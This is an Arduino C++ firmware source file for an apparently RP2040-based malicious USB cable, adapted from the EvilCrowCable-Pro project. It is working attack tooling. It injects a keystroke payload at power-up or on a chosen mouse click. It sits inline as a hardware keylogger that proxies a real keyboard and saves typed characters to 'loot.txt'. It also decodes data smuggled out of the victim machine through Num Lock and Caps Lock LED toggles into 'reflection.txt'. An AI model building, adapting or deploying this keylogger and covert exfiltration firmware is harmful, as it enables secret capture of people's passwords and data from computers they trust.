#include <USBCrowKeyboard.h>
#include "payload.h"
#include "config.h"
#include <LittleFS.h> 
#include "pio_usb.h"
#include "Adafruit_TinyUSB.h"

// based on https://github.com/joelsernamoreno/EvilCrowCable-Pro/tree/main/firmware, edited by @kaliiiiiiiiii

#define HOST_PIN_DP   16

#define MODIFIERKEY_LEFT_CTRL   (0x01)
#define MODIFIERKEY_LEFT_SHIFT  (0x02)
#define MODIFIERKEY_LEFT_ALT    (0x04)
#define MODIFIERKEY_LEFT_GUI    (0x08)
#define MODIFIERKEY_RIGHT_CTRL  (0x10)
#define MODIFIERKEY_RIGHT_SHIFT (0x20)
#define MODIFIERKEY_RIGHT_ALT   (0x40)
#define MODIFIERKEY_RIGHT_GUI   (0x80)
#define SHIFT   (0x80)
#define ALTGR   (0x40)

#define BIT_CHANGED(a, b, mask) (((a) ^ (b)) & (mask))
#define LED_NUM_LOCK (1 << 0)
#define LED_CAPS_LOCK (1 << 1)
#define LED_SCROLL_LOCK (1 << 2)

extern const uint8_t _asciimap[] PROGMEM;

// USB Host object
Adafruit_USBH_Host USBHost;

// holding device descriptor
tusb_desc_device_t desc_device;

static uint8_t mod = 0;
uint8_t modifiersard=0;
uint8_t key;
uint8_t tmp_key;
int key_layout;
int key_modifier_layout;
uint8_t leds = 0;
uint8_t last_leds = 0;
uint8_t c_i = 0;
uint8_t c = 0;

// KEYSTROKE REFLECTION EXFIL 
uint8_t const desc_hid_report_reflection[] = { TUD_HID_REPORT_DESC_KEYBOARD(HID_REPORT_ID(1)) };
//Adafruit_USBD_HID usb_hid_reflection(desc_hid_report_reflection, sizeof(desc_hid_report_reflection), 2, false);

void setup() {
  Serial.begin(115200);
  Keyboard.begin();
  payload();
}

void loop() {
}

void setup1() { 
  if (KEYLOGGER || USBHOST_MOUSE) {
    Serial.println("Core1 setup to run TinyUSB host with pio-usb");

    uint32_t cpu_hz = clock_get_hz(clk_sys);
    if ( cpu_hz != 120000000UL && cpu_hz != 240000000UL ) {
      Serial.printf("Error: CPU Clock = %u, PIO USB require CPU clock must be multiple of 120 Mhz\r\n", cpu_hz);
      Serial.printf("Change your CPU Clock to either 120 or 240 Mhz in Menu->CPU Speed \r\n", cpu_hz);
    }

    pio_usb_configuration_t pio_cfg = PIO_USB_DEFAULT_CONFIG;
    pio_cfg.pin_dp = HOST_PIN_DP;
    USBHost.configure_pio_usb(1, &pio_cfg);
    USBHost.begin(1);
  }
}

void loop1() {
  if (KEYLOGGER || USBHOST_MOUSE) {
    USBHost.task();    
  }
}

void hid_report_callback(uint8_t report_id, hid_report_type_t report_type, uint8_t const* buffer, uint16_t bufsize) {
  if (stage == 2) {
    if (report_type == HID_REPORT_TYPE_OUTPUT) {
      leds = buffer[0];
      exfilReflection();
    }
  }
  else if(stage == 1) {
    if (report_type == HID_REPORT_TYPE_OUTPUT) {
      leds = buffer[0];
    }
  }
}

void exfilReflection() { 
  if (BIT_CHANGED(last_leds, leds, LED_NUM_LOCK)) {
    c <<= 1;
    c |= 1;
    c_i++;
  }
  
  else if (BIT_CHANGED(last_leds, leds, LED_CAPS_LOCK)) {
    c <<= 1;
    c |= 0;
    c_i++;
  }

  if (c_i == 8) {
    Serial.write(c);
    File f = LittleFS.open("reflection.txt", "a");
      if (f) {
        f.write(c);
        f.close();
      }
    c_i = 0;
    c = 0;
  }
  last_leds = leds;
}

void tuh_hid_mount_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* desc_report, uint16_t desc_len) {
  if (KEYLOGGER || USBHOST_MOUSE) {
    if ( !tuh_hid_receive_report(dev_addr, idx) ) {
      Serial.printf("Error: cannot request to receive report\r\n");
    }  
  }
}

void tuh_hid_report_received_cb(uint8_t dev_addr, uint8_t idx, uint8_t const* report, uint16_t len) {
    uint8_t const itf_protocol = tuh_hid_interface_protocol(dev_addr, idx);

    if (KEYLOGGER) {
      switch (itf_protocol) {
        case HID_ITF_PROTOCOL_KEYBOARD:
          process_boot_kbd_report( (hid_keyboard_report_t const*) report );
        break;
      }

      if ( !tuh_hid_receive_report(dev_addr, idx) ) {
        Serial.printf("Error: cannot request to receive report\r\n");
      }
    }

    if (USBHOST_MOUSE) {
      switch (itf_protocol) {
        case HID_ITF_PROTOCOL_MOUSE:
          process_boot_mouse_report( (hid_mouse_report_t const*) report );
        break;
      }

      if ( !tuh_hid_receive_report(dev_addr, idx) ) {
        Serial.printf("Error: cannot request to receive report\r\n");
      }
    }
}

void process_boot_mouse_report(hid_mouse_report_t const * report) {
  
  hid_mouse_report_t prev_report = { 0 };

  uint8_t button_changed_mask = report->buttons ^ prev_report.buttons;
  if ( button_changed_mask & report->buttons) {
    Serial.printf(" %c%c%c ", report->buttons & MOUSE_BUTTON_LEFT   ? 'L' : '-', report->buttons & MOUSE_BUTTON_MIDDLE ? 'M' : '-', report->buttons & MOUSE_BUTTON_RIGHT  ? 'R' : '-');

    if(report->buttons & MOUSE_BUTTON_LEFT) {
      Mouse.press(MOUSE_LEFT);
      delay(100);
      Mouse.release(MOUSE_ALL);

      if (PAYLOAD_RUN_CLICK == "MOUSE_BUTTON_LEFT") {
        payload();
        PAYLOAD_RUN_CLICK = "NONE";
      }
    }

    else if(report->buttons & MOUSE_BUTTON_RIGHT) {
      Mouse.press(MOUSE_RIGHT); 
      delay(100);
      Mouse.release(MOUSE_ALL);

      if (PAYLOAD_RUN_CLICK == "MOUSE_BUTTON_RIGHT") {
        payload();
        PAYLOAD_RUN_CLICK = "NONE";
      }
    }

    else if(report->buttons & MOUSE_BUTTON_MIDDLE) {
      Mouse.press(MOUSE_MIDDLE);
      delay(100);
      Mouse.release(MOUSE_ALL);

      if (PAYLOAD_RUN_CLICK == "MOUSE_BUTTON_MIDDLE") {
        payload();
        PAYLOAD_RUN_CLICK = "NONE";
      }
    }
  }
  
  int8_t x; int8_t y; int8_t wheel;
  Mouse.move(report->x, report->y, report->wheel);
}

void SetModifiersArd(void) {
  modifiersard=0;
  if(mod == 2) modifiersard = SHIFT;
  if(mod == 64) modifiersard = ALTGR;
};

void ProcessKeys(void) {
  if (key == KEY_RETURN) {
    Keyboard.write('\n');
  }
  else if (key == 82) {
    Keyboard.press(KEY_UP_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 81) {
    Keyboard.press(KEY_DOWN_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 80) {
    Keyboard.press(KEY_LEFT_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 79) {
    Keyboard.press(KEY_RIGHT_ARROW); delay(100);Keyboard.releaseAll();
  }
  else if (key == 41) {
    Keyboard.press(KEY_ESC); delay(100);Keyboard.releaseAll();
  }
  else if (key == 73) {
    Keyboard.press(KEY_INSERT); delay(100);Keyboard.releaseAll();
  }
  else if (key == 77) {
    Keyboard.press(KEY_END); delay(100);Keyboard.releaseAll();
  }
  else if (key == 57) {
    Keyboard.press(KEY_CAPS_LOCK); delay(100);Keyboard.releaseAll();
  }
  else if (key == 70) {
    Keyboard.press(KEY_PRINT_SCREEN); delay(100);Keyboard.releaseAll();
  }
  else if (key == 58) {
    Keyboard.press(KEY_F1); delay(100);Keyboard.releaseAll();
  }
  else if (key == 59) {
    Keyboard.press(KEY_F2); delay(100);Keyboard.releaseAll();
  }
  else if (key == 60) {
    Keyboard.press(KEY_F3); delay(100);Keyboard.releaseAll();
  }
  else if (key == 61) {
    Keyboard.press(KEY_F4); delay(100);Keyboard.releaseAll();
  }
  else if (key == 62) {
    Keyboard.press(KEY_F5); delay(100);Keyboard.releaseAll();
  }
  else if (key == 63) {
    Keyboard.press(KEY_F6); delay(100);Keyboard.releaseAll();
  }
  else if (key == 64) {
    Keyboard.press(KEY_F7); delay(100);Keyboard.releaseAll();
  }
  else if (key == 65) {
    Keyboard.press(KEY_F8); delay(100);Keyboard.releaseAll();
  }
  else if (key == 66) {
    Keyboard.press(KEY_F9); delay(100);Keyboard.releaseAll();
  }
  else if (key == 67) {
    Keyboard.press(KEY_F10); delay(100);Keyboard.releaseAll();
  }
  else if (key == 68) {
    Keyboard.press(KEY_F11); delay(100);Keyboard.releaseAll();
  }
  else if (key == 69) {
    Keyboard.press(KEY_F12); delay(100);Keyboard.releaseAll();
  }
  else if (key == 43) {
    Keyboard.press(KEY_TAB); delay(100);Keyboard.releaseAll();
  }
  else if (key == 42) {
    Keyboard.press(KEY_BACKSPACE); delay(100);Keyboard.releaseAll();
  }
}

void process_boot_kbd_report(hid_keyboard_report_t const *report) {
  if (KEYLOGGER) {
    hid_keyboard_report_t prev_report = { 0, 0, {0} };
    static bool prev_modifier_state = false;
    static bool modifier_changed = false;

    if(report->modifier) {
      for(uint8_t i=0; i<6; i++) {
        key = report->keycode[i];
      }
      mod = report->modifier;

      if(key == 0 && mod == 8) {
        Keyboard.press(KEY_LEFT_GUI);
      }
    }

    if(!report->modifier) {
      for(uint8_t i=0; i<6; i++) {
        if (report->keycode[i] ) {
          key = report->keycode[i];
          ProcessKeys();
          key_layout = key,HEX;

          for (int i = 0; i < 128; i++) {
            if(pgm_read_byte(_asciimap + i) == key_layout){
              Keyboard.write(i);
              File f = LittleFS.open("loot.txt", "a");
              if (f) {
                f.write((const uint8_t*)&i, sizeof(i));
                f.close();
              }
            }
          }
        }
      }
    }

    bool current_modifier_state = (report->modifier != 0);

    current_modifier_state = (report->modifier != 0);

    if (current_modifier_state != prev_modifier_state) {
      if (current_modifier_state) {
        Serial.println("MODIFIER PRESSED");
        mod = report->modifier;
        modifier_changed = true;
      } else {
        Serial.println("MODIFIER RELEASED");
        delay(100);
        Keyboard.releaseAll();
        static bool key_pressed = false;
 
        modifier_changed = true;
        mod = 0;

      }
      prev_modifier_state = current_modifier_state;
    }

    if (modifier_changed || current_modifier_state) {
      for (uint8_t i = 0; i < 6; i++) {
        if (report->keycode[i]) {
          key = report->keycode[i];
          SetModifiersArd();
          key_modifier_layout = key|modifiersard,HEX;

          for (int i = 0; i < 128; i++) {
            if(pgm_read_byte(_asciimap + i) == key_modifier_layout){
              File f = LittleFS.open("loot.txt", "a");
              if (f) {
                f.write((const uint8_t*)&i, sizeof(i));
                f.close();
              }
            }
          }

          Keyboard.rawpress(key, mod);
          delay(100);
          Keyboard.rawrelease(key, mod);
        
        }
      }
      modifier_changed = false;
    }

    prev_report = *report;
  }
}
